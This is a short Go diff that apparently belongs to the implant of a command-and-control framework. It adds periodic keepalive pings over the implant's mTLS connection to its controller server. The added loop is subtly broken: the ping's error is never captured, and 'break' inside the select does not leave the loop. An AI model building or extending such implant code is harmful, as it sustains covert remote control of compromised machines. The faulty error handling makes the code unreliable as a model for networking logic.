@@ -48,6 +48,8 @@ import (
 )
 
 var (
+	mtlsPingInterval = 30 * time.Second
+
 	keyPEM    = `{{.Config.Key}}`
 	certPEM   = `{{.Config.Cert}}`
 	caCertPEM = `{{.Config.CACert}}`
@@ -263,6 +265,7 @@ func nextCCServer() *url.URL {
 	return uri
 }
 
+// GetReconnectInterval - Parse the reconnect interval inserted at compile-time
 func GetReconnectInterval() time.Duration {
 	reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
 	if err != nil {
@@ -316,8 +319,22 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 
 	go func() {
 		defer connection.Cleanup()
-		for envelope := range send {
-			socketWriteEnvelope(conn, envelope)
+		for {
+			select {
+			case envelope, ok := <-send:
+				if !ok {
+					return
+				}
+				err := socketWriteEnvelope(conn, envelope)
+				if err != nil {
+					break
+				}
+			case <-time.After(mtlsPingInterval):
+				socketWritePing(conn)
+				if err != nil {
+					break
+				}
+			}
 		}
 	}()
 
